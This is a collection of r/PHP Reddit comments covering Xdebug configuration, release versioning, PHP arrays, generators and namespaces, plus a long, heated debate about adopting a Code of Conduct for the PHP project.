If you do not have xdebug.profiler enabled by default, you shouldn't notice any slowdown. You then trigger the profiler while you're using it. So, use: xdebug.profiler_enable = 0 xdebug.profiler_enable_trigger = 1 You can then start the profiler by using an extension for your browser like [Xdebug helper for Chrome](https://chrome.google.com/webstore/detail/xdebug-helper/eadndfjplgieldjbigjakmdgkmoaaaoc?utm_source=chrome-app-launcher-info-dialog).
/u/CliffEdgeOrg did not only gave his opinion though, he stated a good argument: maintainability. &gt; I tend to look at the services themselves, read the constructor signature, and understand exactly what the object is using to accomplish it's goal. That's just me, though. It's all about the "don't make me think" approach, if you'd rather do all that than look at a single service definition, than it's fine. I don't, That's just me though. 
CMSes
I am not interested in having that debate.
If bandwidth is a real problem [MessagePack](http://msgpack.org/index.html) could help. There is a [php extention](https://pecl.php.net/package/msgpack). Alternatively you could simply transmit via JSON post and enable gzip compression. From experience you always need to page things like this, generally you can handle 100 records at a time, even if the records are potentially large. I default to LIMIT of 1000, then reduce if I run into memory problems.
Why are you synchronizing data every minute? Why doesn't the API server just query the database directly? Or maybe use a messaging queue to feed updates as they come along? If you find yourself really actually needing this, there are a variety of binary formats like protobuf, bson, etc. But it smells like a poor architecture.
This is awesome! I have been meaning to give the ADR pattern a try, and this would be the simplest way to do that. Now I need to find a project haha.
Shouldn't be a problem if you're using FastCGI. mod_php might be another story entirely, but I haven't tried multiple xdebug sessions in that environment in like a decade and memories are fuzzy.
When you "volunteer" for a project, you're working pro bono as a programmer. You can still be fired for pro bono work when your conduct is unbecoming and makes the organization you're working for look bad. What you're demanding is not that we don't change the programming industry to fit your demand for free speech. What you're demanding is that the programming industry act differently from *every other service industry*.
All I wanted was a "fat" function in order to demonstrate the idea, not sure why I added the class in there, while I was aware that people are going to start pointing out the problems with the class and ignore the whole point of the article.. However, I have updated the disclaimer in the article &gt; Disclaimer: Nothing to take seriously here. Ignore the fact that there is anything such as OOP. Ignore all those SOLID principles. Let the architect inside you sleep for a bit and just take this example only as the means of explaining Comment Driven Development Let us keep it to "Comment Driven Development" for a bit ;-)
I don't know the answer, and I'm also interested in learning what composer would do in this situation. Would it compare the commit hashes from the remote tag and the local cache? It seems like a fairly simple test to do. Tag it 'wrong', `require` it from somewhere else, retag it on remote and `composer update` it wherever you required it to see if it updates.
Delete the release and tag a *new* release number. Gaps in release numbers are fine. Gaps in your releases will *not* cause you a headache. The potential conflicts of there having been two different sest of code with the same release number undoubtably will however. Long story short, never ever reuse release numbers. If you do, your not doing semantic versioning. Never be afraid to throw numbers away, they're infinite and free. Shameless self promotion, but I wrote a post on the topic - https://donatstudios.com/Numberphilia
minus the CoC stuff, can you point to a time where someone on internals was abusive?
And the big problem with that definition is that taking the devils advocate position can be extremely valuable.
The tag after your name says "Don't listen to me". Just saying.
Please do name the one time a CTO refused to use a technology because someone he disagreed with politically happened to contribute to the code base.
But quite possibly contain people like [this lady](http://techcrunch.com/2013/03/21/a-dongle-joke-that-spiraled-way-out-of-control/). 
I'm not sure there's anything to debate. Clearly (as you note) many times when someone is offended by the statements of someone else, it's because they're reading intent into those statements that probably was never there to begin with. Because of this, it's basically impossible to codify what "offensive behavior" means in any realistic manner, since it's basically open to interpretation of the person being offended, which the original speaker has little to no control over. 
Well, I read this as 2 issues. 1. Create a common model interface to hold a collection (VideoCollection) and entity (VideoEntity). (say, VideoSearchEntity, VideoSearchEntityCollection) 2. Create an index to search said model created in 1 (VideoSearchEntity). If you tackle these one at a time, you'll find that your solution #1 is probably your best bet.
I've done it. I don't do it any more. It created a lot of random classes and there was little benefit. You need developers to put their feet in the sand and say "This controller needs to be refactored, it's grown too large.". If you don't think you could do that, then maybe 1 off controllers is the thing for you. But if you're team is okay with refactoring your controller once it hits a given size, you're application will be cleaner(IMO).
There are so many things wrong with this tack. 1. You're downplaying a system by which organizations become compliant with HARASSMENT LAW into "political differences". And if you can't tell the difference between harassment and political differences, this only serves to highlight the need for training and better understanding of harassment in the technology industry\*. (\*On reading this comment again, it occurs to me that it doesn't do anyone any good to say "get out of the field", and it *does* do more good to stress the importance of a better understanding of harassment laws.) 2. There is a significant rational disconnect in your demand. If I can't name a CTO who refused to use a technology because that technology was developed by an organization that was non-compliant with harassment laws, does that mean the technology industry is *fine* and needs no changes? It's arguments like this that make me wonder how we as a society made progress beyond practices like slavery. The majority didn't have a problem with it, so it must be okay to do, right? 3. Since when is it that CTOs are the only people responsible for choosing a technology for use in a project? I frankly can't tell if you worded your question this way because you were being reductive, or if you actually don't know how technology businesses work and you have no background in the professional world. To modify your question so it sounds sane, YES, the people at organizations who choose technologies can and do avoid technologies whose project teams are known for harassment of their colleagues, especially if they would publicly announce their use of certain technologies. Lawyers and doctors who spout gender and racial slurs miss out on certain clients too, imagine that! 4. Yes, people very rarely have any idea whether the product they're buying is made by a company that espouses a culture of equality in their workplace, and they're even less likely to question it when it's free. That doesn't mean they're okay with that behavior. 5. Compliance with civil rights begins from the inside out. If you were an employee of a company, recognized as a public figure by your company and by your peers in the industry, and you spouted racial and gender slurs, your company would fire you. Because that's bad PR. If you spouted them at co-workers and colleagues, they would complain to your company's HR department for harassment - even if it was outside of the workplace - if you were LUCKY. If you weren't lucky, they'd file suit against you. You understand that even though the PHP project isn't enacting a code of conduct, harassment laws *do* apply to volunteers and to non-profits?
&gt; How would we arrive at a project, any project, being considered extremist? It's the mentality of the people in the group that matters, and if they think that having a CoC is too extreme (because of whatever reasons), then they will interpret the proposal to transition PHP be an "extremist" project. Whereas other people think that not standing up for anyone who had a negative experience while interacting with anyone that's somehow associated with PHP is negligent, and rejecting a proposal would be seen by them as an extreme form of this negligence, bordering on aggression. Naturally, these are archetypes, most of the people on internals don't even care that much, but this is the endgame, and we can interpret the current situation between these extremes. &gt; That, I don't understand. If the maintainer of a great project turns out to be an asshole, the logical outcome would seem to fork and continue without that person. But who would want to tinker with low-level architecture specific bits of GNU C Library? So it was just left in the dark. Forking it would mean to maintain it, but people only wanted to get a few bugs fixed, or something changed, not to take over the project. It was a local optimum. A lose-lose situation if you will. &gt; My problems with CoC's in general is their tendency to evolve in to thought police, or are overly draconian, penalizing people for using single-gender references in code comments. Yeah, I'm aware, but that's just not a constructive view. The idea of having a how to for interacting with and within a community is not a bad one. That having silly rules and enforcing them is of course a very bad one. And luckily we can have one without the other. (Yes, I know you worry about the tendency, which is understandable, but that's why I started with an economical argument. What's more productive for the project on the long term? (We should care about the short term too, but on the short term we can assume things won't change much and if they do they change toward the state that'll be eventually the long term state.) So, if there are problems with these interactions, then maybe having a guidebook is productive. But if these policies always turn into tools of oppression, then we might need to address the interaction problems in an other way. But anyhow, if the project's hivemind decides to address the problem, then that basically amounts to precedent, to establishing a rule, to going through the collective decisionmaking process to arrive at a decision at all, and that's basically the same as collectively composing rules for interaction.) In the end it amounts to a trade-off. What's more hazardous on the long term? The decisons/policies about problematic interactions or the foul interactions themselves? (Or maybe inaction.) &gt; That's a populist statement. People didn't dislike this on the basis that they dislike any and all CoC. People complained what was written was too vague. Meaning: too open for interpretation. Meaning they feared people would be able to abuse the system. Umm, yes, you're right, sorry, I should have worded that differently. I was largely thinking about the aggregated response to these CoC proposals (the Linux kernel went through a few iterations of this debate already, then there was they various conferences - PyCon being one with a few high profile cases). And I share their sentiment to a certain extent, but I'm not really afraid about this, because eventually a rational/productive middle ground will prevail. Those projects that overdo it will just wither away. Or people will just fork them, or leave them. Usually these are very visible events, but not really interesting on the long run. (At least I don't know of any project where it mattered. If a community has strong inclusivity, tends to handle problems proactively and well, then a CoC is just an empty gesture at that point. And if a community is really hostile, then their CoC would be kind of a statement of everyone can just fuck off, and maintainers are always right, your code is always shit, but ... maybe we'll merge it if you write a hundred testcases for us, hahaha!) Sure, it'll be interesting to watch this and the whole outburst of this faux-social-justice thing while the real deal about all kinds of inequality unfolds in that other space called "IRL" :)
A nice simple explanation. I know what DI is and most explanations have me running to the hills
In my experience, you can logically separate out the actions. Assume you have a forum/reddit-esque site. You may have a `PostController` that allows you to view, edit, create, and delete posts. You then add post following, users can follow a post and be notified when it's been edited. I'd probably first add `follow` and `unfollow` methods into the `PostController`. But you could easily place them in a separate controller, `PostFollowController`. Then assume you want to allow user's to comment on a post. You may start out with `PostController::comment(Post $post)`, but later you may want the ability to delete or edit comments. You could create a `PostCommentController` with the create, delete, and edit methods. I don't think refactoring these methods into separate controllers will create any confusion when attempting to locate which controller and method a particular route is linked to. `POST /post/{post}/comment` probably links to `PostCommentController::create(Post $post)`
I think op really just wants a list of other ORMs to go through
I actually changed my position since I wrote that original post. I did some thinking and generics do make sense in certain contexts so I am all for it now :P just saying! 
Hahaha, I love your username!!!! Try storing everything in a database and then connect to it and pull out your data (arrays) wherever you need it.
I've [tried to pin it down](https://www.reddit.com/r/funny/comments/p7u3k/troll_level_master/c3n98ia), but I think that the line between "troll" and "devil's advocate" depends on whether the person is truly invested in the same goal (e.g. good policy) or whether it's just a game of pissing other people off.
This post was removed because you have a new account and we get a lot of spam from newly created accounts. If you have any questions or think your post should be reinstated, please send a message to the mods. *I am a bot, and this action was performed automatically. Please [contact the moderators of this subreddit](/message/compose/?to=/r/PHP) if you have any questions or concerns.*
As I've noted elsewhere, the Code of Merit is effectively the exact opposite to the proposed COC. It's actually worse than having nothing because it explicitly rejects any and all concerns outside of writing code. That's simply not how any community operates effectively. An alternative take, Anthony was frustrated and retired to save his sanity. The End. It doesn't require fan fiction to be appended to it.
Laravel replaced Django a year ago for me.
I'm not sure how you have it configured, but you can set the IP address that Xdebug connects to in the vhost options. It's a lot more secure than relying on connect back. php_value xdebug.remote_host 192.168.XXX.XXX That way you can share the common Xdebug configuration in Apache, but change the connect back IP address based on which vhost is being accessed. To answer your original point, yes, Xdebug can dramatically slow down performance if it's on and enabled. Composer even warns you if it's on when you do an update. So as /u/dkarlovi said, don't enable it by default, and use cookies with a browser plugin to enable it.
Unfortunately msgpack is a bit [busted](https://github.com/msgpack/msgpack-php/blob/master/tests/bug002.phpt) when it comes to arrays with many children, so just be aware of this /u/WorstDeveloperEver. Someday I will get around to fixing it... However, I agree with the general sentiment that you may have an architecture issue. Instead of scheduling a pull, you should see if you can push smaller chunks of data to your API boxes. Also, is anyone complaining about out of sync data (if a pull hasn't occurred yet users could see out of date info) 
[removed]
&gt; It seems from your allegory that you're arguing that "if a person's output is good, then their personality isn't relevant". No, that's not what I'm saying. It's not about "their personality," it's about their professionalism. If they come in to work and do their job, then I don't care (obviously within the bounds of the law) what they do in their free time. And that's a good thing, if I couldn't work with anyone who held beliefs or acted in a way with which I disagreed, I'd never collaborate. And Twitter is just about the worst thing to happen to civilization and specifically the internet in a long, long time. Off-the-cuff responses that would at most earn a "Dude, chill" response instead can cost you your job. I don't care if someone's an asshole on twitter, facebook, or fucking myspace. If it's not illegal and not related to work, it would take a lot for me to get behind any kind of "action" against the person.
&gt;But the more objections I see, the more I feel the nature of the objections actually justifies the Covenant as the choice rather than justifies switching it. The continual use by CoC supporters of this form of argument is the best demonstration of why the CoC is a terrible idea
Yeah, there's no "special" way to do it, just simple file includes. I've been using klein, which has `$app-&gt;with("/admin/", "app/routes/admin.php")` and that file is in a different scope and doesn't need to know which path it's being "mounted" (for lack of a better word) as. 
&gt; it's even more regrettable that the vitriolic anti-CoC people essentially got what they wanted. The vitriolic pro CoC people getting what they wanted would be better?
I had a full response typed out to this and shit crashed. Awesome. I'll try this again. Professionalism is exactly at issue here. When you make sexist and racist remarks to the people on your friends list, and one of your co-workers is on your friends list, that is harassing behavior. Yes, your co-worker can complain. When you make sexist or racist remarks on your Twitter or a public Facebook post, for *everyone* to see, that is harassing behavior to anyone who sees it. Yes, your co-worker can complain. Is your Twitter anonymous? Do you keep co-workers who would make complaints about you (i.e. people with whom you *only* have a professional relationship) off of your friends list? Is your contributor profile anonymous, and none of your collaborators know it's you on social media making sexist or racist remarks? Then you're not creating a hostile work environment. I work for a major Fortune 500. Seriously attentive HR department, very compliant with harassment laws. The HR department knows that a few members of the tech team goes to Tilted Kilt ("Scottish Hooters") for lunch on Mondays. Their solution? "It's cool if you guys do that, just don't go blabbing about it to the entire company". None of us are going on Twitter or LinkedIn to run our mouths about it because then we wouldn't get nice things.
I would recommend deleting the existing tag and adding a +1 minor version tag. So if your botched release was 1.2.3, make a 1.2.4 tag and then delete 1.2.3. Edit: /u/donatj has it exactly right.
Speaking from personal experience, you will likely have issues with the composer cache &amp; satis data referring to the previous hash of the version tag. I've not used Toran proxy or an internal Packagist install yet, so I'm unsure how they'd handle hash conflicts. In these circumstances, satis can refer to the previous hash until a new tag has been pushed to the repo- there might also be issues with the composer.lock file. Undoing the problems is not worth the hassle of just doing a new release.
I'm not sure I follow your analogy, or your definition of architecture. You still create the boundaries between modules, components and define their relationships and dependencies, however instead of choosing *how* you pass objects to them and around your application, which you enforce via typehints *anyway*, they're merely instantiated via introspection of those typehints instead. It's removing a single (often arduous) step. Both of your comments make no sense.
&gt; Never be afraid to throw numbers away, they're infinite and free. You and your numerical privilege.
There was the time Ramus had to tell people to be nice. Internals is infamous for being rather abusive. I can't point to an exact thing but I highly suspect scalar type hinting would have quite a bit. But if you spend time going through the list you'll see examples. 
Apologizing alone isn't effective. It treats the symptom, but doesn't look at the cause. Most of the time, people are good. Most of the time, people aren't trying to be harmful. Most of the time, people act in good faith. These are intentional decisions. Sometimes you can say things that you don't actually realize are hurtful, without ever actually intending "harm." If you *accidentally* insult someone bad enough that they ask you to apologize for it, you need to understand *why* it was a thing worth needing an apology for. This is why the [mediation approach](https://www.reddit.com/r/PHP/comments/40is8w/elephpant_etiquette_or_an_alternate_proposal_for/) *might* be a better way to handle CoC stuff in PHP.
See also: [sea-lioning](http://wondermark.com/1k62/). If you think someone's trolling you, **DISENGAGE**. It's the only clean solution, even if it means that they "win."
Firstly, I agree that the considerations you brought forward have merit and certainly need to be part of the decision making process that would lead to formulating a better CoC. I'm just going to pick out the following question, since it seems to be the core issue. &gt;What's more productive for the project on the long term? Any project thrives if the community works well together. And having a ruleset in place to govern that is totally fine. What I'm thinking is perhaps not have internal people actually take care of the disputes. Literally have someone come from the outside to look at it. My main point here is that whomever would be arbiter in any dispute, should not be someone who is involved with the project, because that could not possibly be neutral. That's my point of view. 1. Have a less vague wording 2. Have outside people help.
So is driving away good contributors because they're getting harassed and nobody is empowered to stop the harassment. So is driving away good contributors because they're paranoid that they're going to be subject to a witch hunt because of their personal opinions that they already don't express when interacting with the project.
I've used Django in the past, and Flask a bit for personal projects. Work has been pylons/pyramid plus a lot of customization.
Hang on, did we see different versions of this? The proposed one gives the power to run witch hunts over personal opinions expressed in other venues. So did the one that was withdrawn. If anything, this seems clearly geared towards attaining ideological purity.
Donglegate.
Even if you're the best developer in the world, if you're regularly abrasive to work with, nobody will want to work with you. For example, the guy formerly in charge of glibc. Counterpoint, Linus, but I don't think I've seen him go off when not discussing code. Communication style *matters.*
Sure, but that's not related to this discussion at all.
Neither was bringing up python in a question about PHP.
I could prove it, I'm too lazy to do it from my phone. Especially when a quick browse through the news list will show it. Also I'm neither for or against. Doesn't affect me either way. 
Abortion is legal, so's whale hunting where it's practiced; weird set of examples. Also both have nothing to do with PHP. Conferences do.
Turning on remote-autostart can be great when you want to debug a complex flow, because *every* web request can hit your breakpoints, no just the ones which happen to have the right magic request-vars or cookies. They also means webservice-y requests and cron-jobs.
You could use a SQLite database. One script creates and populates the database, the other will query it.
This post was removed because you have a new account and we get a lot of spam from newly created accounts. If you have any questions or think your post should be reinstated, please send a message to the mods. *I am a bot, and this action was performed automatically. Please [contact the moderators of this subreddit](/message/compose/?to=/r/PHP) if you have any questions or concerns.*
At work? Data management, data capture, high performance data reporting, potential work on IR and NLP. Batch processing. 
Not so much sarcasm as just setting up the punchline. &gt; if so why would this be important.... It's not important....what happens in a database is this: * You start a transaction in process A. * You start a transaction in process B. * You insert a row in process A. * You insert a row in process B. * An error condition is detected in process A, and the transaction is rolled back. * Process B has no error, and the transaction is committed. Because the insert in process 'A' was going to use one row, and so one primary key, the insert for process uses the next available primary key. This is not a problem unless you have severe OCD. Programmers with OCD to "fix this problem" by re-ordering the primary keys.......which breaks all referential integrity, which is bad. Very bad. Instead, as donatj said for version numbers, just don't worry about leaving gaps in primary keys. It just isn't a problem. Oh apparently, [mysql fill gaps primary key](https://www.google.co.uk/webhp?sourceid=chrome-instant&amp;ion=1&amp;espv=2&amp;ie=UTF-8#q=mysql+fill+gaps+primary+key) is the thing to search for, to see people worrying about it.
Not so much Eloquent itself, but the way people use it. Some people just throw query builder calls every where. In controllers, service providers, handlers, console commands, even views. Its just as bad as the old days of using `mysql_query` anywhere you felt the need. DB access should stay in a single layer. Typically either the model itself, or in a data access layer/repository pattern. 
Great idea. But then who to ask will be an interesting question. (Jury of your peers?) Instead of outright banning certain behavior a good playbook would give methods to separate good, desirable, constructive interaction and agents from the bad, harmful stuff.
I like flask a lot, that is a real micro framework. And python syntax is delightful. Sinatra must be nice too. 
My first thought was that it would asplode when it tried to serialize Doctrine lazy-proxies, but it looks the hateoas library is "Doctrine-aware" and will inspect the Doctrine configuration found through the `addMetaData()` call, so it avoids naively dumping a potentially-enormous object graph.
&gt; Is wrong I think. The correct output would be 2. Yup! https://3v4l.org/R9bSp 
What a lazy article. The examples are sometimes useless (the spaceship operator one for example) and even, as noted, outright wrong. The descriptions of the changes are entirely contextless. Go to the bottom and try to figure out what in the world `capture_session_meta` is talking about, and in what context before reaching the named function call.
There are also some fun pitfalls when it comes to key-types and conversion. For example, this fails, because it silently converts booleans to integers, converts some (but not all!) strings, and truncates floats. (Both sixes will collide, too.) &lt;?php $keys = [false, true,"3","4", 5.99999, 6, "6"]; $a = array(); foreach($keys as $k){ $a[$k] = "Originally " . var_export($k,true); } $keys2 = array_keys($a); var_dump($a); assert($keys === $keys2); So PHP arrays seem easy at first, but they can bite you hard with runtime bugs. Respect their ancient insanity, and always be very very clear about what *way* any given one is going to be used. If you're going to use them as a mapping, I recommend you make sure that every key is a *string*, not just on the way in, but *also* on the way out when you get a key with `foreach` or `array_keys()`. 
I too love UUIDs but as your PK in InnoDB it will likely end up your clustered index (how it's physically ordered on disk) and cause constant rewrites. Very slow for anything with lots of inserts.
In addition to headzoo's response, there's a closely-related "sometimes-wrong way" that I want to mention, known as the "service-locator antipattern". A looks something like this: class Emailer { protected $logger; protected $config; public function __construct($serviceLocator) { $this-&gt;logger = $serviceLocator-&gt;createEmailerLogger(); $this-&gt;config = $serviceLocator-&gt;getEmailerConfig(); } } The long-term problem with this approach is that your shared `$serviceLocator` eventually becomes a big messy god-object that may be in charge of finding (or creating) everything for everyone from anywhere at any time. 
While true, I don't think you'd see communities quite like /r/laravel or laracasts springing up around Symfony. Symfony is definitely intimidating as fuck to someone who's just finished a `$bear-&gt;eat()` tutorial on Sitepoint, so you don't see a lot of newer devs flocking to a forum and asking a lot of beginner questions. Laravel's ease has attracted a lot of developers who are still learning programming and problem solving, but it's also attracted a lot of seasoned developers who want to work with a [framework that feels like]( https://i.embed.ly/1/display/resize?key=1e6a1a1efdb011df84894040444cdc60&amp;url=http%3A%2F%2F24.media.tumblr.com%2F0786f2164b1e90fe145115010e41cf04%2Ftumblr_mlv1nuNujD1sp7rjlo1_500.gif&amp;width=810) and [not like](http://pop.h-cdn.co/assets/15/26/1435348160-hutman-2.gif)
Do you have a php league valid licence to create tutorials? 
...yes? This is a thread asking for opinions, is it not expected to give them? It's not like I came into an r/php thread as a non-php developer to piss on the language. PHP is one of the languages I write the most in, and I think it definitely has its strengths, but also its weaknesses. And while it's been improving notably the last few years, there are so many things about it that make it less suitable for most applications than alternatives.
Absolutely no issues here whatsoever, using it for production software.
Do any array functions work on them? Map, walk, reduce etc? 
Just wait. Over the new few weeks / months there will start to be incidents that start happening with people who recently joined various projects / communities but have contributed nothing, and a CoC will be brought up again, but this time with proof as to why one is needed.
No. Python's methods are inherently class methods (which are inherently just functions), which is why you have to define the `self` (aka `this`) context as an argument. They have no internal reference to the instance they are attached to and thus have no implicit `this` or `self` context like PHP does, despite being callable from an instance of an object. While this allows you to do something like this: def full_name_with_abbreviated_last_name(user): return user.first_name + ' ' + user.last_name[0] + '.' user.getFullName = full_name_with_abbreviated_last_name I find it annoying to have to do this: def getFullName(self): return self.first_name + ' ' + self.last_name When 99% of the time I just need to do this: def getFullName(): return this.first_name + ' ' + this.last_name
But no type hinting?
&gt;This Code of Conduct applies both within project spaces and in public spaces when an individual is representing the project or its community. So any person who is involved in the project can be targeted by someone who doesn't approve of the persons views or opinions by claiming they are offensive can and will be removed. So now this person is a target of harassment by the very "anti-harassment" rules set in place by the CoC. &gt; Project maintainers who do not follow or enforce the Code of Conduct may be permanently removed from the project team. But then lets say a project maintainer decides no, this is ridiculous or knows it is a person abusing the CoC just in an attempt to harm the guilty party. This project maintainer is then removed from the project team for not enforcing the morality rules set by the committee for the Promotion of Virtue and Prevention of Vice. Yeah, this will work out well.
Is it really that different? An object implicitly passing itself (not an instance of itself: the object *is* the instance) to a function which is attached to it is the essence of all instance method calls, in all programming languages. The specifics of *how* the object passes itself to the function varies from language to language, sure. In C++ and Java a "current" object is implicit in all method calls, is implicitly considered in identifier scope resolution, and can be accessed through the magic identifier `this`. In PHP the receiver is implicitly bound to `$this` but must be explicitly referenced within a method. In Python the receiver is bound to the method but in the form of a normal argument, which is then stored away in a totally nonmagical local variable usually called `self`. They're different, to be sure, but they're not fundamentally distinct enough for one to be considered an instance method and one not to be. If Python doesn't have instance methods, does Lua? In Lua you write method definitions *and* calls with a colon, like so: foo = {x = 12} function foo:method() print(self.x) end foo:method() # prints 12 It's identical to PHP's treatment of receiver objects - you have a magic identifier which references the receiver, and you must explicitly use that identifier to access the receiver's fields. But the truth is that the colon syntax is merely sugar and is equivalent to the following: foo = {x = 12} function foo.method(self) print(self.x) end foo.method(foo) # prints 12 In other words, there's *no* support for passing a receiver to its methods besides syntactic sugar. Yet this is still functionally equivalent to PHP's instance method support, if not more powerful.
Hmm, still works for me.
Yes, but documentation is nonexistent. For example, there used to be overhead when using count() in a for loop. However, PHP now stores the value internally so basically the performance hit is negligible. But you would only know that if you [read the PHP source code](http://php.net/manual/en/function.count.php#116726) or have a co-worker who knows (great person to have in a code-review)
&gt; and there are many more things in PHP that drive me absolutely bonkers in a large project than similar things in Python In a large project? I would think most of the "bonkers" things in PHP are pretty fundamental (naming conventions, casting rules, etc). But in the concerns of large projects, what in PHP drives you bonkers? PHP is pretty similar to most languages from 50 feet away. 
I'm guessing that goal is somewhat at-odds with the current "minimal lines of code in each implementation" effect, but it'd probably just be a matter a boilerplate: A bunch of function-definitions that add param/return docblock annotations. (Or maybe @method annotations on the class.) However, literal type-hints will conflict with the PHP interfaces: The interface promises it takes anything as an input, so you cannot narrow that down in a subclass/implementing-class. 
Python has instance methods it just makes the object instance an explicit parameter rather than an implicit one. In PHP (and every other OO language) it works exactly the same under the hood -- every method has an implicit first parameter that is the "this" instance. Python is definitely an odd-ball OOP language for making that explicit but otherwise it's fundamentally the same thing. 
All my intranet applications use REST calls to a PHP back-end. The back-ends mostly update databases, or extract data from databases or third parties, or process payments of some kind. Why Python programmers continue to troll this group and respond to these questions that are clearly PHP specific is beyond me. Hopefully they return to their own little world and leave the PHP folks alone. 
Why would you use this instead of phpmyadmin, which is proven and been around for a long time. Also there are a bunch of other alternatives. Can this project and go create another framework...
I did not intend it to be that. I just wanted to develop something for the sake of learning experience and thought to put it on github and share it with the world to hear what they have to say about the quality of code etc in order for me to understand, how can I get better at the craft. So let us just look at it with an eye of the critic and point out the things that could have been done better or can be improved :)
I'm not sure I've ever had a use case for this either, but it was mentioned in #phpc on freenode the other day and I thought I'd give it a crack (that's a decent community IRC channel to hang out on that isn't focused on PHP help if anyone is interested). I was more trying to share the stuff you can do with [ArrayIterator](http://php.net/manual/en/class.arrayiterator.php) (now [ArrayObject](http://php.net/manual/en/class.arrayobject.php) thanks to a [helpful PR](https://github.com/AndrewCarterUK/TypedArrays/pull/1)). People might also be interested in these interfaces: [ArrayAccess](http://php.net/manual/en/class.arrayaccess.php), [Traversable](http://php.net/manual/en/class.traversable.php), [Iterator](http://php.net/manual/en/class.iterator.php). 
I think that would be impossible to add without a language feature such as generics? But if anyone things of anything let me know. I could remove the `final` keyword on the `InstanceArray` so that it could be extended into a custom type: class ExceptionArray extends \TypedArray\InstanceArray { public function __construct(array $source = null) { parent::__construct(\Exception::class, $source); } } But it'd probably be better to create a separate abstract class that was designed to be extended for this purpose.
So how does this work? The symfony indexer pulls the data from the Migros system and then puts it into the search cluster, and the symfony rest apis then access the search cluster? 
If transforming actions into a reusable set of middlewares is your goal, [why not define your controllers as services?](http://symfony.com/doc/current/cookbook/controller/service.html) You don't even need to extend an abstract controller.
&gt; stampede Can you Elaborate on this point? The only way i can imagine archiving "fresh" cache is when you store the data with its ID as key, and then you can CUD the cache entries by their ID. But i have no clue how performant (is performant even a word?) that is..
That is such a good link - thank you (I've bookmarked it to go through properly later). PHP being a high level language at least intends to abstract you away from those sorts of intricacies in behaviour. The difference between the different C standards and modes of optimisation is probably comparable to the different PHP versions, INI settings and run time environments (unix, windows, PHP-FPM, etc...). There's definitely lots of oddities and irregularities in PHP too, I bet /u/the_alias_of_andrea would do a good talk on that! 
The CoC specifically says that it applies when you are representing PHP or its community. When you are *representing*, you ought to be held to higher standards than when you're just a random attendee to a conference (or participant in a mailing list, etc). Whatever you say/do will reflect on outsiders' opinions of PHP. In a corporate setting, you may be fired for tarnishing a firm's reputation.
a good example is in wordpress environment, Name spacing stops you accident re-defining variables or functions that another plugin developer may have which would throw a fatal error. among many other reasons its just generally good practice!
&gt; it's fundamentally the same thing. Yeah right, just like function inconsistent function arguments.. * str_replace(find,replace,string,count) * str_replace(replace,find,string,count) But hey, it does the same thing!!! 
So it's best for large code bases. What about small stuff where I'm the only one coding?
What would be a better example of how to do it?
What are the benefits of namespacing - prevent name collision(for classes, functions,...)..
Using require_once means you'll have to do it in every other script. Using include_once is worse, you'll have to do it in every other script AND it may fail silently (depending on your error reporting level) if the file is not found. Yes, usually a collision issue. Imagine a nice library that's a bit old and not using namespaces, but that does something you really need. If all your other code is using namespaces, you can be pretty sure that including that classes and functions used in that library would not collide with those you already use. Otherwise, you will need to check the names used in the library's code. Sometimes a collision can be just an innocent function named "display()", or whatever obvious/common name you may use in your code.
Try iterator_to_array($result). And same applies to foreach: foreach ($generator as $key =&gt; $value) { /* ... */ }
Yes i know that iterator_to_array fixes it, but i dont want to need it.
That's about your question about why they allow to yield keys :)
&gt; Using require_once means you'll have to do it in every other script. Autoloading doesn't really solve that problem. Instead we have to write `use \Vendor\Library\Class` in every other script. It's a better abstraction though, as opposed the having to know exactly where a file is located.
&gt; its not the language's job to provide a module system wat
If you wanted to be all fancy, you could create your own class which takes a Generator as input and have your class implement ArrayAccess. But that would be much the same as iterator_to_array which I'd say would be likely to just as efficient if not more so. If you want to access an array, why not just use an array? Why allow you to yield keys? Because when looping over an iterator you can still return the key which could be important depending on how you use the generator. Why not allow you to access it like an array? Because you can't be 100% certain that the result will have the key you want until the function has run completely through. ArrayAccess rely's on you knowing all the data as soon as you access it.
who cares ? go fork php , it's open source after all. Good luck finding talented developers. They usually don't waste their time with social justice.
&gt; that developers should behave however the hell they want with no repercussions. The force of law is not required for repercussions. That's the fucking point. When you start expecting people to be literally voted off the island and placed in exile because they disagree with you - you become dangerous.
more or less... templating engines use them however.
I know the what, the question is why? If it was purely an itterable structure, there wouldn't be a need to yield keys...
It's just a different structure. If you want an array, use an array. Try the following: function transform(array $data = []) { foreach ($data as $key =&gt; $value) { yield $key =&gt; $value; sleep(2); } } $gen = transform(["a", "b", "c"]); foreach ($gen as $key =&gt; $value) { var_dump($key, $value); print "\n"; } The generator doesn't know all the keys in advance.
Lazy recruiter is lazy.
it's int(2). that's the wrong answer i had given. because when there is no null variable it will directly display the first variable with data. in this case it's 2.
&gt;Instead of outright banning certain behavior a good playbook would give methods to separate good, desirable, constructive interaction and agents from the bad, harmful stuff. That would in theory be good, but then people will complain they're being belittled and they'll refuse. Complicated stuff, setting up CoC's.
If I understood correctly what you need you can create your own class implementing \ArrayAccess interface and provide your own offset* implementations. You can have an iterator inside which iterates until it finds the given key (offset) if the key wasn't found earlier. 
You get everything namespaced and autoloaded! Those *are* the benefits.
It is difficult to maintain, for a start.
I think the way autoloading and namespacing has been formalised, standardised and rolled out across a multitude of modern frameworks and applications *to great affect*, buts this opinion *why out of line* of most developer's experience. People should read your comment to see just how stuck in their ways some developers can become.
Decouples your classes from physical file location and prevents class name conflicts.
And yet again you manipulatively downplay the impact of harassment as "disagreeing". If you don't believe that there's *anything* you can say that will create a hostile and harmful environment for your peers, you're the danger. And again, if you disagree, that's for you to take up with your government, because there are already laws in effect that are on my side in this. Think you should be able to say anything you like in a work environment? Go lobby Congress about it.
&gt; Any opinions? That will require an RFC. Go for it. It would probably also be good to have something added to composer, so that libraries can declare that they have been tested with global strict enabled, rather than people having to manually check libraries.
Can't even format the message properly.
The argument unpacking (or splat) operator [has been added in PHP5.6](http://php.net/manual/en/migration56.new-features.php#migration56.new-features.splat).
We only allow remote postings in this sub.
&gt; "100% ignorant of where the file is"! What a lie! Huh? When using something like composer the final location of the classes *is* 100% unimportant since you would use the composer autoloader and it resolves class names to files for you. &gt;instead of file path, you are remembering the FQN You already need to know the FQN of the class anyway. &gt;you wouldn't know if there is a typo in the FQN of the class Except that every modern IDE *will* tell you if the class is not found already. 
That's also a nice gotcha if you intend to use iterator_to_array, you might loose data
This right here has convinced me it's time to give PHP a try again. This is beautiful.
A global strict_types in the sense of an ini setting is out of the questions, for reasons of inter-compatibility. What would be ideal is a per-module setting. However, this would of course first require extending the current namespaces in a proper module system :)
